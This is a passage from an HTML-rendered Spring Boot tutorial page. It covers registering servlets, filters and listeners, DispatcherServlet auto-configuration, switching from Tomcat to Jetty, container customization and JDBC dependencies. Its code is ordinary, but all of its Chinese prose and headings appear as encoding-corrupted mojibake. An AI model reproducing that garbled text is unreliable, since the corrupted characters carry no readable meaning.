class="hljs-params">(ServletContextEvent sce)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;MySwervletContextListenerç›‘å¬åˆ°é¡¹ç›®é”€æ¯&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åè¿˜è¦åœ¨ä¸»å¯åŠ¨ç±»æ·»åŠ æ³¨è§£<code>@ServletComponentScan</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ServletComponentScan(basePackages = &quot;com.lun&quot;)</span><span class="hljs-comment">//</span><br><span class="hljs-meta">@SpringBootApplication(exclude = RedisAutoConfiguration.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Boot05WebAdminApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(Boot05WebAdminApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Springæ–¹å¼æ³¨å…¥"><a href="#Springæ–¹å¼æ³¨å…¥" class="headerlink" title="Springæ–¹å¼æ³¨å…¥"></a>Springæ–¹å¼æ³¨å…¥</h3><p><code>ServletRegistrationBean</code>, <code>FilterRegistrationBean</code>, and <code>ServletListenerRegistrationBean</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = true)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRegistConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletRegistrationBean <span class="hljs-title function_">myServlet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">MyServlet</span> <span class="hljs-variable">myServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyServlet</span>();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRegistrationBean</span>(myServlet,<span class="hljs-string">&quot;/my&quot;</span>,<span class="hljs-string">&quot;/my02&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FilterRegistrationBean <span class="hljs-title function_">myFilter</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-type">MyFilter</span> <span class="hljs-variable">myFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyFilter</span>();<br><span class="hljs-comment">//        return new FilterRegistrationBean(myFilter,myServlet());</span><br>        <span class="hljs-type">FilterRegistrationBean</span> <span class="hljs-variable">filterRegistrationBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterRegistrationBean</span>(myFilter);<br>        filterRegistrationBean.setUrlPatterns(Arrays.asList(<span class="hljs-string">&quot;/my&quot;</span>,<span class="hljs-string">&quot;/css/*&quot;</span>));<br>        <span class="hljs-keyword">return</span> filterRegistrationBean;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletListenerRegistrationBean <span class="hljs-title function_">myListener</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">MySwervletContextListener</span> <span class="hljs-variable">mySwervletContextListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySwervletContextListener</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletListenerRegistrationBean</span>(mySwervletContextListener);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="57ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-ã€æºç åˆ†æã€‘DispatcherServletæ³¨å…¥åŸç†"><a href="#57ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-ã€æºç åˆ†æã€‘DispatcherServletæ³¨å…¥åŸç†" class="headerlink" title="57ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-ã€æºç åˆ†æã€‘DispatcherServletæ³¨å…¥åŸç†"></a>57ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-ã€æºç åˆ†æã€‘DispatcherServletæ³¨å…¥åŸç†</h2><p><code>org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration</code>é…ç½®ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(DispatcherServlet.class)</span><br><span class="hljs-meta">@AutoConfigureAfter(ServletWebServerFactoryAutoConfiguration.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServletAutoConfiguration</span> &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The bean name for a DispatcherServlet that will be mapped to the root URL &quot;/&quot;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_DISPATCHER_SERVLET_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dispatcherServlet&quot;</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The bean name for a ServletRegistrationBean for the DispatcherServlet &quot;/&quot;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dispatcherServletRegistration&quot;</span>;<br><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@Conditional(DefaultDispatcherServletCondition.class)</span><br><span class="hljs-meta">@ConditionalOnClass(ServletRegistration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(WebMvcProperties.class)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServletConfiguration</span> &#123;<br><br>        <span class="hljs-comment">//åˆ›å»ºDispatcherServletç±»çš„Bean</span><br><span class="hljs-meta">@Bean(name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span><br><span class="hljs-keyword">public</span> DispatcherServlet <span class="hljs-title function_">dispatcherServlet</span><span class="hljs-params">(WebMvcProperties webMvcProperties)</span> &#123;<br><span class="hljs-type">DispatcherServlet</span> <span class="hljs-variable">dispatcherServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispatcherServlet</span>();<br>dispatcherServlet.setDispatchOptionsRequest(webMvcProperties.isDispatchOptionsRequest());<br>dispatcherServlet.setDispatchTraceRequest(webMvcProperties.isDispatchTraceRequest());<br>dispatcherServlet.setThrowExceptionIfNoHandlerFound(webMvcProperties.isThrowExceptionIfNoHandlerFound());<br>dispatcherServlet.setPublishEvents(webMvcProperties.isPublishRequestHandledEvents());<br>dispatcherServlet.setEnableLoggingRequestDetails(webMvcProperties.isLogRequestDetails());<br><span class="hljs-keyword">return</span> dispatcherServlet;<br>&#125;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnBean(MultipartResolver.class)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span><br><span class="hljs-keyword">public</span> MultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">(MultipartResolver resolver)</span> &#123;<br><span class="hljs-comment">// Detect if the user has created a MultipartResolver but named it incorrectly</span><br><span class="hljs-keyword">return</span> resolver;<br>&#125;<br><br>&#125;<br>    <br>    <span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@Conditional(DispatcherServletRegistrationCondition.class)</span><br><span class="hljs-meta">@ConditionalOnClass(ServletRegistration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(WebMvcProperties.class)</span><br><span class="hljs-meta">@Import(DispatcherServletConfiguration.class)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServletRegistrationConfiguration</span> &#123;<br><br>        <span class="hljs-comment">//æ³¨å†ŒDispatcherServletç±»</span><br><span class="hljs-meta">@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)</span><br><span class="hljs-meta">@ConditionalOnBean(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span><br><span class="hljs-keyword">public</span> DispatcherServletRegistrationBean <span class="hljs-title function_">dispatcherServletRegistration</span><span class="hljs-params">(DispatcherServlet dispatcherServlet,</span><br><span class="hljs-params">WebMvcProperties webMvcProperties, ObjectProvider&lt;MultipartConfigElement&gt; multipartConfig)</span> &#123;<br><span class="hljs-type">DispatcherServletRegistrationBean</span> <span class="hljs-variable">registration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispatcherServletRegistrationBean</span>(dispatcherServlet,<br>webMvcProperties.getServlet().getPath());<br>registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);<br>registration.setLoadOnStartup(webMvcProperties.getServlet().getLoadOnStartup());<br>multipartConfig.ifAvailable(registration::setMultipartConfig);<br><span class="hljs-keyword">return</span> registration;<br>&#125;<br><br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispatcherServlet</code>é»˜è®¤æ˜ å°„çš„æ˜¯ <code>/</code> è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¿®æ”¹<code>spring.mvc.servlet.path=/mvc</code>ã€‚</p><h2 id="58ã€åµŒå…¥å¼Servletå®¹å™¨-ã€æºç åˆ†æã€‘åˆ‡æ¢webæœåŠ¡å™¨ä¸å®šåˆ¶åŒ–"><a href="#58ã€åµŒå…¥å¼Servletå®¹å™¨-ã€æºç åˆ†æã€‘åˆ‡æ¢webæœåŠ¡å™¨ä¸å®šåˆ¶åŒ–" class="headerlink" title="58ã€åµŒå…¥å¼Servletå®¹å™¨-ã€æºç åˆ†æã€‘åˆ‡æ¢webæœåŠ¡å™¨ä¸å®šåˆ¶åŒ–"></a>58ã€åµŒå…¥å¼Servletå®¹å™¨-ã€æºç åˆ†æã€‘åˆ‡æ¢webæœåŠ¡å™¨ä¸å®šåˆ¶åŒ–</h2><ul><li><p>é»˜è®¤æ”¯æŒçš„WebServer</p><ul><li><code>Tomcat</code>, <code>Jetty</code>, or <code>Undertow</code>ã€‚</li><li><code>ServletWebServerApplicationContext </code>å®¹å™¨å¯åŠ¨å¯»æ‰¾<code>ServletWebServerFactory</code> å¹¶å¼•å¯¼åˆ›å»ºæœåŠ¡å™¨ã€‚</li></ul></li><li><p>åŸç†</p><ul><li>SpringBootåº”ç”¨å¯åŠ¨å‘ç°å½“å‰æ˜¯Webåº”ç”¨ï¼Œwebåœºæ™¯åŒ…-å¯¼å…¥tomcatã€‚</li><li>webåº”ç”¨ä¼šåˆ›å»ºä¸€ä¸ªwebç‰ˆçš„IOCå®¹å™¨ <code>ServletWebServerApplicationContext</code> ã€‚</li><li><code>ServletWebServerApplicationContext</code>  å¯åŠ¨çš„æ—¶å€™å¯»æ‰¾ <code>ServletWebServerFactory</code> ï¼ˆServlet çš„webæœåŠ¡å™¨å·¥å‚â€”â€”&gt;Servlet çš„webæœåŠ¡å™¨ï¼‰ã€‚</li><li>SpringBootåº•å±‚é»˜è®¤æœ‰å¾ˆå¤šçš„WebServerå·¥å‚ï¼ˆ<code>ServletWebServerFactoryConfiguration</code>å†…åˆ›å»ºBeanï¼‰ï¼Œå¦‚ï¼š<ul><li><code>TomcatServletWebServerFactory</code></li><li><code>JettyServletWebServerFactory</code></li><li><code>UndertowServletWebServerFactory</code></li></ul></li><li>åº•å±‚ç›´æ¥ä¼šæœ‰ä¸€ä¸ªè‡ªåŠ¨é…ç½®ç±»<code>ServletWebServerFactoryAutoConfiguration</code>ã€‚</li><li><code>ServletWebServerFactoryAutoConfiguration</code>å¯¼å…¥äº†<code>ServletWebServerFactoryConfiguration</code>ï¼ˆé…ç½®ç±»ï¼‰ã€‚</li><li><code>ServletWebServerFactoryConfiguration  </code>æ ¹æ®åŠ¨æ€åˆ¤æ–­ç³»ç»Ÿä¸­åˆ°åº•å¯¼å…¥äº†é‚£ä¸ªWebæœåŠ¡å™¨çš„åŒ…ã€‚ï¼ˆé»˜è®¤æ˜¯web-starterå¯¼å…¥tomcatåŒ…ï¼‰ï¼Œå®¹å™¨ä¸­å°±æœ‰ <code>TomcatServletWebServerFactory</code></li><li><code>TomcatServletWebServerFactory </code>åˆ›å»ºå‡ºTomcatæœåŠ¡å™¨å¹¶å¯åŠ¨ï¼›<code>TomcatWebServer</code> çš„æ„é€ å™¨æ‹¥æœ‰åˆå§‹åŒ–æ–¹æ³•initializeâ€”â€”<code>this.tomcat.start();</code></li><li>å†…åµŒæœåŠ¡å™¨ï¼Œä¸ä»¥å‰æ‰‹åŠ¨æŠŠå¯åŠ¨æœåŠ¡å™¨ç›¸æ¯”ï¼Œæ”¹æˆç°åœ¨ä½¿ç”¨ä»£ç å¯åŠ¨ï¼ˆtomcatæ ¸å¿ƒjaråŒ…å­˜åœ¨ï¼‰ã€‚</li></ul></li></ul><p>Spring Booté»˜è®¤ä½¿ç”¨TomcatæœåŠ¡å™¨ï¼Œè‹¥éœ€æ›´æ”¹å…¶ä»–æœåŠ¡å™¨ï¼Œåˆ™ä¿®æ”¹å·¥ç¨‹pom.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#howto-use-another-web-server">å®˜æ–¹æ–‡æ¡£ - Use Another Web Server</a></p><h3 id="å®šåˆ¶Servletå®¹å™¨"><a href="#å®šåˆ¶Servletå®¹å™¨" class="headerlink" title="å®šåˆ¶Servletå®¹å™¨"></a>å®šåˆ¶Servletå®¹å™¨</h3><ul><li><p>å®ç°<code>WebServerFactoryCustomizer&lt;ConfigurableServletWebServerFactory&gt;</code> </p></li><li><ul><li>æŠŠé…ç½®æ–‡ä»¶çš„å€¼å’Œ<code>ServletWebServerFactory</code>è¿›è¡Œç»‘å®š</li></ul></li><li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>server.xxx</code></p></li><li><p>ç›´æ¥è‡ªå®šä¹‰ <code>ConfigurableServletWebServerFactory</code></p></li></ul><p><code>xxxxxCustomizer</code>ï¼šå®šåˆ¶åŒ–å™¨ï¼Œå¯ä»¥æ”¹å˜xxxxçš„é»˜è®¤è§„åˆ™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;<br><span class="hljs-keyword">import</span> org.springframework.boot.web.servlet.server.ConfigurableServletWebServerFactory;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomizationBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebServerFactoryCustomizer</span>&lt;ConfigurableServletWebServerFactory&gt; &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">customize</span><span class="hljs-params">(ConfigurableServletWebServerFactory server)</span> &#123;<br>        server.setPort(<span class="hljs-number">9000</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="59ã€å®šåˆ¶åŒ–åŸç†-SpringBootå®šåˆ¶åŒ–ç»„ä»¶çš„å‡ ç§æ–¹å¼ï¼ˆå°ç»“ï¼‰"><a href="#59ã€å®šåˆ¶åŒ–åŸç†-SpringBootå®šåˆ¶åŒ–ç»„ä»¶çš„å‡ ç§æ–¹å¼ï¼ˆå°ç»“ï¼‰" class="headerlink" title="59ã€å®šåˆ¶åŒ–åŸç†-SpringBootå®šåˆ¶åŒ–ç»„ä»¶çš„å‡ ç§æ–¹å¼ï¼ˆå°ç»“ï¼‰"></a>59ã€å®šåˆ¶åŒ–åŸç†-SpringBootå®šåˆ¶åŒ–ç»„ä»¶çš„å‡ ç§æ–¹å¼ï¼ˆå°ç»“ï¼‰</h2><h3 id="å®šåˆ¶åŒ–çš„å¸¸è§æ–¹å¼"><a href="#å®šåˆ¶åŒ–çš„å¸¸è§æ–¹å¼" class="headerlink" title="å®šåˆ¶åŒ–çš„å¸¸è§æ–¹å¼"></a>å®šåˆ¶åŒ–çš„å¸¸è§æ–¹å¼</h3><ul><li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶</p></li><li><p><code>xxxxxCustomizer</code></p></li><li><p>ç¼–å†™è‡ªå®šä¹‰çš„é…ç½®ç±»  <code>xxxConfiguration</code> + <code>@Bean</code>æ›¿æ¢ã€å¢åŠ å®¹å™¨ä¸­é»˜è®¤ç»„ä»¶ï¼Œè§†å›¾è§£æå™¨</p></li><li><p>Webåº”ç”¨ ç¼–å†™ä¸€ä¸ªé…ç½®ç±»å®ç° <code>WebMvcConfigurer</code> å³å¯å®šåˆ¶åŒ–webåŠŸèƒ½ + <code>@Bean</code>ç»™å®¹å™¨ä¸­å†æ‰©å±•ä¸€äº›ç»„ä»¶</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminWebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>@EnableWebMvc</code> + <code>WebMvcConfigurer</code> â€” <code>@Bean</code>  å¯ä»¥å…¨é¢æ¥ç®¡SpringMVCï¼Œæ‰€æœ‰è§„åˆ™å…¨éƒ¨è‡ªå·±é‡æ–°é…ç½®ï¼› å®ç°å®šåˆ¶å’Œæ‰©å±•åŠŸèƒ½ï¼ˆ<strong>é«˜çº§åŠŸèƒ½ï¼Œåˆå­¦è€…é€€é¿ä¸‰èˆ</strong>ï¼‰ã€‚<ul><li>åŸç†ï¼š<ol><li><code>WebMvcAutoConfiguration</code>é»˜è®¤çš„SpringMVCçš„è‡ªåŠ¨é…ç½®åŠŸèƒ½ç±»ï¼Œå¦‚é™æ€èµ„æºã€æ¬¢è¿é¡µç­‰ã€‚</li><li>ä¸€æ—¦ä½¿ç”¨ <code>@EnableWebMvc</code> ï¼Œä¼š<code>@Import(DelegatingWebMvcConfiguration.class)</code>ã€‚</li><li><code>DelegatingWebMvcConfiguration</code>çš„ä½œç”¨ï¼Œåªä¿è¯SpringMVCæœ€åŸºæœ¬çš„ä½¿ç”¨<ul><li>æŠŠæ‰€æœ‰ç³»ç»Ÿä¸­çš„<code>WebMvcConfigurer</code>æ‹¿è¿‡æ¥ï¼Œæ‰€æœ‰åŠŸèƒ½çš„å®šåˆ¶éƒ½æ˜¯è¿™äº›<code>WebMvcConfigurer</code>åˆèµ·æ¥ä¸€èµ·ç”Ÿæ•ˆã€‚</li><li>è‡ªåŠ¨é…ç½®äº†ä¸€äº›éå¸¸åº•å±‚çš„ç»„ä»¶ï¼Œå¦‚<code>RequestMappingHandlerMapping</code>ï¼Œè¿™äº›ç»„ä»¶ä¾èµ–çš„ç»„ä»¶éƒ½æ˜¯ä»å®¹å™¨ä¸­è·å–å¦‚ã€‚</li><li><code>public class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport</code>ã€‚</li></ul></li><li><code>WebMvcAutoConfiguration</code>é‡Œé¢çš„é…ç½®è¦èƒ½ç”Ÿæ•ˆå¿…é¡»  <code>@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</code>ã€‚</li><li>@EnableWebMvc å¯¼è‡´äº†WebMvcAutoConfiguration  æ²¡æœ‰ç”Ÿæ•ˆã€‚</li></ol></li></ul></li></ul><h3 id="åŸç†åˆ†æå¥—è·¯"><a href="#åŸç†åˆ†æå¥—è·¯" class="headerlink" title="åŸç†åˆ†æå¥—è·¯"></a>åŸç†åˆ†æå¥—è·¯</h3><p>åœºæ™¯starter - <code>xxxxAutoConfiguration</code> - å¯¼å…¥xxxç»„ä»¶ - ç»‘å®š<code>xxxProperties</code> - ç»‘å®šé…ç½®æ–‡ä»¶é¡¹ã€‚</p><h2 id="60ã€æ•°æ®è®¿é—®-æ•°æ®åº“åœºæ™¯çš„è‡ªåŠ¨é…ç½®åˆ†æä¸æ•´åˆæµ‹è¯•"><a href="#60ã€æ•°æ®è®¿é—®-æ•°æ®åº“åœºæ™¯çš„è‡ªåŠ¨é…ç½®åˆ†æä¸æ•´åˆæµ‹è¯•" class="headerlink" title="60ã€æ•°æ®è®¿é—®-æ•°æ®åº“åœºæ™¯çš„è‡ªåŠ¨é…ç½®åˆ†æä¸æ•´åˆæµ‹è¯•"></a>60ã€æ•°æ®è®¿é—®-æ•°æ®åº“åœºæ™¯çš„è‡ªåŠ¨é…ç½®åˆ†æä¸æ•´åˆæµ‹è¯•</h2><h3 id="å¯¼å…¥JDBCåœºæ™¯"><a href="#å¯¼å…¥JDBCåœºæ™¯" class="headerlink" title="å¯¼å…¥JDBCåœºæ™¯"></a>å¯¼å…¥JDBCåœºæ™¯</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ¥ç€å¯¼å…¥æ•°æ®åº“é©±åŠ¨åŒ…ï¼ˆMySQLä¸ºä¾‹ï¼‰ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--é»˜è®¤ç‰ˆæœ¬ï¼š--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>8.0.22<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;version&gt;5.1.49&lt;/version&gt;--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">æƒ³è¦ä¿®æ”¹ç‰ˆæœ¬</span><br><span class="hljs-comment">1ã€ç›´æ¥ä¾èµ–å¼•å…¥å…·ä½“ç‰ˆæœ¬ï¼ˆmavençš„å°±è¿‘ä¾èµ–åŸåˆ™ï¼‰</span><br><span class="hljs-comment">2ã€é‡æ–°å£°æ˜ç‰ˆæœ¬ï¼ˆmavençš„å±æ€§çš„å°±è¿‘ä¼˜å…ˆåŸåˆ™ï¼‰</span><br><span 